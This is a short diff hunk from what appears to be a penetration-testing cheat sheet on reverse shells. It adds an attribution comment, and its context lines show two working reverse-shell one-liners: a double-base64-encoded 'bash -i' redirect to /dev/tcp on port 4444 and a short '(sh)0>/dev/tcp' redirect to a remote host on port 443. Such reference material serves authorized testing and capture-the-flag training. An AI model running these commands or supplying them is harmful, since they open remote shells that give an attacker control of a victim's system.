@@ -11,6 +11,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 ### Short Rev shell
 
 ```bash
+#Trick from Dikline
 #Get a rev shell with
 (sh)0>/dev/tcp/10.10.10.10/443
 #Then get the out of the rev shell executing inside of it:
